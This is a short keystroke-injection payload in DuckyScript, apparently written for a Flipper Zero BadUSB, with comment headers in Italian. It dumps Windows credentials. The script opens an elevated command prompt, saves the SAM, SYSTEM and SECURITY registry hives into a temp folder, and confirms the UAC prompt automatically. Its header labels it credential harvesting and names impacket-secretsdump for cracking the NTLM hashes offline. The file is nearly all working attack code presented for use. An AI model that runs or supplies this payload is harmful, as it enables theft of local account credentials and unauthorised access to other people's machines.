REM ============================================================
REM Title:    SAM/SYSTEM/SECURITY Dump
REM Target:   Windows 10/11
REM Author:   FlipperZero-guide
REM Category: Credential Harvest
REM Privs:    Admin REQUIRED
REM Layout:   IT
REM Time:     ~10 secondi
REM Detect:   Alto - reg save è monitorato da EDR
REM Desc:     Dumpa i file SAM, SYSTEM e SECURITY per
REM           cracking offline degli hash NTLM locali.
REM           Crack con: impacket-secretsdump -sam SAM
REM                      -system SYSTEM -security SECURITY LOCAL
REM ============================================================

DELAY 2000
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs -ArgumentList '/c mkdir %TEMP%\sam_dump && reg save HKLM\SAM %TEMP%\sam_dump\SAM /y && reg save HKLM\SYSTEM %TEMP%\sam_dump\SYSTEM /y && reg save HKLM\SECURITY %TEMP%\sam_dump\SECURITY /y'
ENTER
DELAY 2000
REM UAC prompt - conferma
ALT y
DELAY 1000
